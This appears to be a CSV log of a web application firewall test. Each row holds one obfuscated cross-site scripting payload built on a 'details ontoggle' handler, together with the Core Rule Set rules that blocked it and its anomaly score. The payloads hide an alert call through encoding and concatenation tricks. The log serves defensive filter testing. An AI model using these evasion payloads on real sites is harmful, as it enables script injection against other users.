219,"<details open ontoggle=""(function(){var s='ale'+'rt';(0,window[s])(1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o62,12v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || o25,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o56,9v217,77t:urlDecodeUni,t:compressWhitespace || ",30,177826415317.467256
220,"<details open ontoggle=""(function(){var u='al'+'\x65'+'rt';window[u](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o65,11v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,79t:urlDecodeUni,t:compressWhitespace || ",30,177826415533.411002
221,"<details open ontoggle=""(function(){var v='al'+'ert';self[''+v](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o57,14v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,74 || o25,11v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,10v217,74t:urlDecodeUni,t:compressWhitespace || ",30,177826415718.484174
222,"<details open ontoggle=""(function(){var a='al';var b='ert';this[a+b](1)})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o63,12v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || o25,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,77t:urlDecodeUni,t:compressWhitespace || ",30,177826415910.262218
225,"<details open ontoggle=""(function(){top['al'+'ert'](1)})()"">",0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o33,6v217,60 || o24,34v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,60 || o25,11v217,60t:urlDecodeUni || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,15v217,60t:urlDecodeUni,t:compressWhitespace || ",35,177826416540.773789
228,"<details open ontoggle=""(function(){this['al\u0065rt'](1)})()"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,18v217,63t:urlDecodeUni,t:compressWhitespace || ",20,177826417126.889259
230,"<details open ontoggle=""(function(){parent['a'+'l'+'e'+'r'+'t'](1)})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,46v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,72 || o25,11v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782641753.299222
242,"<details open ontoggle=""(function(){var a=[97,108,101,114,116].map(x=>String.fromCharCode(x)).join('');window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o109,11v217,122t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,122 || v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o103,9v217,122t:urlDecodeUni,t:compressWhitespace || ",25,177826419940.145090
243,"<details open ontoggle=""(function(){var a=atob('YWxlcnQ=');window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o65,11v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,78t:urlDecodeUni,t:compressWhitespace || ",25,177826420191.839200
244,"<details open ontoggle=""(function(){var a='al'+'er'+'t';window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o62,11v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,75 || o25,11v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o56,9v217,75t:urlDecodeUni,t:compressWhitespace || ",30,177826420444.014702
246,"<details open ontoggle=""(function(){var a=unescape('%61%6c%65%72%74');window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o66,11v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,89 || o25,11v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o60,9v217,89t:urlDecodeUni,t:compressWhitespace || ",30,177826420850.246392
247,"<details open ontoggle=""(function(){var a=decodeURIComponent('%61%6c%65%72%74');window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o76,11v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,99 || o25,11v217,99t:urlDecodeUni || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o70,9v217,99t:urlDecodeUni,t:compressWhitespace || ",30,177826421066.315472
249,"<details open ontoggle=""(function(){var a='\u0061\u006c\u0065\u0072\u0074';window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o81,11v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o75,9v217,94t:urlDecodeUni,t:compressWhitespace || ",25,177826421469.858386
250,"<details open ontoggle=""(function(){var a=String.fromCodePoint(97,108,101,114,116);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o89,11v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o83,9v217,102t:urlDecodeUni,t:compressWhitespace || ",25,177826421656.359100
251,"<details open ontoggle=""(function(){var b=top,a=String.fromCharCode(97,108,101,114,116);b[a](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o89,11v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826421996.133657
252,"<details open ontoggle=""(function(){var b=self,a=String.fromCharCode(97,108,101,114,116);b[a](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o90,11v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826422144.606815
253,"<details open ontoggle=""(function(){var a=String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116);window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o172,11v217,185t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,185 || o25,11v217,185t:urlDecodeUni || v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o166,9v217,185t:urlDecodeUni,t:compressWhitespace || ",30,177826422326.421633
254,"<details open ontoggle=""(function(){with(window)this[String.fromCharCode(97,108,101,114,116)](1);})()"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,52v217,103t:urlDecodeUni,t:compressWhitespace || ",20,177826422581.773105
255,"<details open ontoggle=""(function(){var a=String['fromCharCode'](97,108,101,114,116);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,54v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v217,104t:urlDecodeUni,t:compressWhitespace || ",25,177826422738.711361
256,"<details open ontoggle=""(function(){var c={};c.a=String.fromCharCode(97,108,101,114,116);window[c.a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o95,13v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o89,11v217,110t:urlDecodeUni,t:compressWhitespace || ",25,17782642293.180337
257,"<details open ontoggle=""(function(){var a=[String.fromCharCode(97),String.fromCharCode(108),String.fromCharCode(101),String.fromCharCode(114),String.fromCharCode(116)].join('');window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o183,11v217,196t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,196 || v217,196t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,196t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o177,9v217,196t:urlDecodeUni,t:compressWhitespace || ",25,177826423178.771024
258,"<details open ontoggle=""(function(){var obj={m:String.fromCharCode(97,108,101,114,116)};window[obj.m](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o94,15v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,13v217,111t:urlDecodeUni,t:compressWhitespace || ",25,177826423328.461726
260,"<details open ontoggle=""(function(){var chars=[97,108,101,114,116];var a=chars.reduce((s,c)=>s+String.fromCharCode(c),'');window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o128,11v217,141t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,141 || o25,11v217,141t:urlDecodeUni || v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o122,9v217,141t:urlDecodeUni,t:compressWhitespace || ",30,177826423753.158771
261,"<details open ontoggle=""(function(){var a=(function(){return String.fromCharCode(97,108,101,114,116);})();window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o112,11v217,125t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,125 || v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o106,9v217,125t:urlDecodeUni,t:compressWhitespace || ",25,177826423961.952255
262,"<details open ontoggle=""(function(){var b=String.fromCodePoint(97,108,101,114,116);window[b]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o89,14v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o83,9v217,105t:urlDecodeUni,t:compressWhitespace || ",25,177826424128.355795
263,"<details open ontoggle=""(function(){var c=atob('YWxlcnQ=');window[c]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o65,14v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,81t:urlDecodeUni,t:compressWhitespace || ",25,177826424368.484509
265,"<details open ontoggle=""(function(){var e='ale'+'rt';window[e]('XSS')})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o59,14v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,75 || o25,11v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,9v217,75t:urlDecodeUni,t:compressWhitespace || ",30,177826424732.482642
266,"<details open ontoggle=""(function(){var f=String['from'+'CharCode'](97,108,101,114,116);window[f]('XSS')})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o48,60v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || o25,11v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,110t:urlDecodeUni,t:compressWhitespace || ",30,17782642509.693376
267,"<details open ontoggle=""(function(){var g=unescape('%61%6c%65%72%74');window[g]('XSS')})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o66,14v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,92 || o25,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o60,9v217,92t:urlDecodeUni,t:compressWhitespace || ",30,177826425112.302063
268,"<details open ontoggle=""(function(){var h=decodeURI('%61lert');window[h]('XSS')})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o67,14v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,85 || o25,11v217,85t:urlDecodeUni || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,9v217,85t:urlDecodeUni,t:compressWhitespace || ",30,177826425385.025323
270,"<details open ontoggle=""(function(){var j=String[`fromCharCode`](97,108,101,114,116);window[j]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o91,14v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v217,107t:urlDecodeUni,t:compressWhitespace || ",25,177826425820.169757
275,"<details open ontoggle=""(function(){var q=String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[q]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o94,14v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,110t:urlDecodeUni,t:compressWhitespace || ",25,177826426882.885159
276,"<details open ontoggle=""(function(){var r=[String][0].fromCharCode(97,108,101,114,116);window[r]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o93,14v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o87,9v217,109t:urlDecodeUni,t:compressWhitespace || ",25,177826427027.417188
277,"<details open ontoggle=""(function(){var s=String['fromCh'+'arCode'](97,108,101,114,116);window[s]('XSS')})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o48,60v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || o25,11v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,110t:urlDecodeUni,t:compressWhitespace || ",30,17782642723.292990
279,"<details open ontoggle=""(function(){var u=({}).constructor.constructor('return ale'+'rt')();u(1)})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o42,58v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,102 || o25,11v217,102t:urlDecodeUni || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782642762.506601
280,"<details open ontoggle=""(function(){var v=String.fromCharCode(0141,0154,0145,0162,0164);window[v]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o94,14v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,110t:urlDecodeUni,t:compressWhitespace || ",25,17782642780.018678
281,"<details open ontoggle=""(function(){var w=[].find.constructor('return ale'+'rt')();w(1)})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o42,49v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,93 || o25,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782642800.369933
283,"<details open ontoggle=""(function(){var b=atob('YWxlcnQ');window[b](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o64,11v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,9v217,78t:urlDecodeUni,t:compressWhitespace || ",25,177826428547.555847
285,"<details open ontoggle=""(function(){var d=`${`ale`}${`rt`}`;window[d](1);})();"">",0,1,block,7,"932130,933210,934100,941100,941120,941370,949110","o42,31v217,80t:urlDecodeUni,t:cmdLine || o66,11v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o60,9v217,80t:urlDecodeUni,t:compressWhitespace || ",30,17782642887.688786
286,"<details open ontoggle=""(function(){var e=unescape('%61%6c%65%72%74');window[e](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o66,11v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,90 || o25,11v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o60,9v217,90t:urlDecodeUni,t:compressWhitespace || ",30,177826429027.869004
287,"<details open ontoggle=""(function(){var f=String['fromCharCode'](97,108,101,114,116);window[f](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,54v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v217,105t:urlDecodeUni,t:compressWhitespace || ",25,17782642922.832922
288,"<details open ontoggle=""(function(){var g=decodeURIComponent('%61%6c%65%72%74');window[g](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o76,11v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,100 || o25,11v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o70,9v217,100t:urlDecodeUni,t:compressWhitespace || ",30,177826429576.910256
289,"<details open ontoggle=""(function(){var h=[...atob('YWxlcnQ=')].join('');window[h](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o79,11v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o73,9v217,93t:urlDecodeUni,t:compressWhitespace || ",25,177826429774.186597
291,"<details open ontoggle=""(function(){var j=(_=>_)(String).fromCharCode(97,108,101,114,116);window[j](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o96,11v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o90,9v217,110t:urlDecodeUni,t:compressWhitespace || ",25,177826430132.141058
292,"<details open ontoggle=""(function(){var k=top[atob('YWxlcnQ=')];k(1);})();"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,21v217,76t:urlDecodeUni,t:compressWhitespace || ",20,177826430381.963540
293,"<details open ontoggle=""(function(){var m=self['al'+'ert'];m(1);})();"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,71 || o25,11v217,71t:urlDecodeUni || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,16v217,71t:urlDecodeUni,t:compressWhitespace || ",25,177826430597.778520
294,"<details open ontoggle=""(function(){var n=parent[String.fromCodePoint(97,108,101,114,116)];n(1);})();"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826430784.666296
295,"<details open ontoggle=""(function(){var o=[0x61,0x6c,0x65,0x72,0x74].reduce((a,b)=>a+String.fromCodePoint(b),'');window[o](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o119,11v217,133t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,133 || o25,11v217,133t:urlDecodeUni || v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o113,9v217,133t:urlDecodeUni,t:compressWhitespace || ",30,177826430911.147060
297,"<details open ontoggle=""(function(){var q=[]['constructor']['constructor']('return String')()['fromCharCode'](97,108,101,114,116);window[q](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o42,105v217,150t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,150 || v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o130,9v217,150t:urlDecodeUni,t:compressWhitespace || ",25,177826431314.562467
298,"<details open ontoggle=""(function(){var r=`${String[`${'from'}${'CharCode'}`](97,108)}${String['fromCharCode'](101,114,116)}`;window[r](1);})();"">",0,1,block,7,"932130,933210,934100,941100,941120,941370,949110","o42,91v217,146t:urlDecodeUni,t:cmdLine || o94,49v217,146t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,146 || v217,146t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,146t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o126,9v217,146t:urlDecodeUni,t:compressWhitespace || ",30,177826431573.381950
